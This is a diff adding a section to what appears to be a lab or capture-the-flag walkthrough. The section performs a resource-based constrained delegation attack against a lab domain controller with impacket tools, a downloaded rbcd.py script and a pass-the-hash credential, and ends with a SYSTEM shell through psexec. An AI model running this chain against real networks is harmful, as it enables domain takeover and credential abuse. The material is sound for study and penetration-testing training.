@@ -338,3 +338,113 @@ usemodule credentials/mimikatz/dcsync_hashdump
 usemodule credentials/mimikatz/dcsync
 
 ```
+
+
+### Resource Based Constrained Delegation
+
+Let's use our access with the `l.livingstone` account to create a new machine account on the domain. We can do with by using `impacket-addcomputer`.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
+```
+
+We can verify that this machine account was added to the domain by using our `evil-winrm` session from before.
+
+```
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack
+
+
+DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
+DNSHostName       :
+Enabled           : True
+Name              : ATTACK
+ObjectClass       : computer
+ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9
+SamAccountName    : ATTACK$
+SID               : S-1-5-21-537427935-490066102-1511301751-3601
+UserPrincipalName :
+```
+
+With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) and use it to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our new machine account.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
+...
+┌──(kali㉿kali)-[~]
+└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
+[*] Initializing LDAP connection to 192.168.120.181
+[*] Using resourced\l.livingstone account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
+[*] Delegation rights modified succesfully!
+[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+```
+
+We can confirm that this was successful by using our `evil-winrm` session.
+
+```
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
+
+Path Owner                  Access
+---- -----                  ------
+     BUILTIN\Administrators resourced\ATTACK$ Allow
+```
+
+We now need to get the administrator service ticket. We can do this by using `impacket-getST` with our privileged machine account.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+This saved the ticket on our Kali host as **Administrator.ccache**. We need to export a new environment variable named `KRB5CCNAME` with the location of this file.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=./Administrator.ccache
+```
+
+Now, all we have to do is add a new entry in **/etc/hosts** to point `resourcedc.resourced.local` to the target IP address and run `impacket-psexec` to drop us into a system shell.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts'
+
+┌──(kali㉿kali)-[~]
+└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on resourcedc.resourced.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file zZeQFeGQ.exe
+[*] Opening SVCManager on resourcedc.resourced.local.....
+[*] Creating service rEwK on resourcedc.resourced.local.....
+[*] Starting service rEwK.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2145]
+(c) 2018 Microsoft Corporation. All rights reserved.
+ 
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> 
+```
+
+Success! We now have system access on the target system.
